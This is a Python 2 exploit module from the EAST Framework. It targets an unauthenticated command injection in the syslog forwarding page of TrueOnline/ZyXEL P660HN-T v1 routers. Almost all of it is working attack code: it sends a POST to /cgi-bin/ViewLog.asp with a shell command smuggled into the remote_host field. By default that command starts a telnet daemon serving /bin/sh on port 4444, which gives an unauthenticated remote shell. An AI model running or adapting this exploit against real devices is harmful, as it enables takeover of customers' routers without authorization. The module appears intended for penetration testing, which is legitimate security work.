#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import urllib2
import base64
from time import sleep

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_trueonline_zyxel_p660hnt_router_rce"
INFO['DESCRIPTION'] = "TrueOnline / ZyXEL P660HN-T v1 Router Unauthenticated Command Injection"
INFO['VENDOR'] = ""
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://packetstormsecurity.com/files/140867/TrueOnline-ZyXEL-P660HN-T-v1-Router-Unauthenticated-Command-Injection.html']
INFO["CVE Name"] = ""
INFO["NOTES"] = """TrueOnline is a major ISP in Thailand, and it distributes a customised version of the ZyXEL P660HN-T v1 router. This customised version has an unauthenticated command injection vulnerability in the remote log forwarding page.
This module was tested in an emulated environment, as the author doesn't have access to the Thai router any more. Any feedback should be sent directly to the module's author.
There are other language strings in the firmware, so it is likely that this firmware is not only distributed in Thailand. Other P660HN-T v1 in other countries might be vulnerable too."""

INFO['CHANGELOG'] = "02 Feb, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = "80", dict(description = 'Target port')
OPTIONS["COMMAND"] = 'utelnetd -l /bin/sh -p 4444 -d', dict(description = 'Command')

class exploit(Sploit):
    def __init__(self, host="", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.command = ""
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.command = self.args.get('COMMAND', self.command)
        
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
        
    def run(self):
        self.args()
        
        self.log('Try to use exploit with unauthenticated injection')
        
        data = 'remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&remoteSubmit=Save&remote_host=;{};#'.format(self.command)
        request = urllib2.Request(self.make_url('/cgi-bin/ViewLog.asp'), data)
        try:
            fd = urllib2.urlopen(request)
        except Exception as e:
            self.log(e)
            self.finish(False)
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()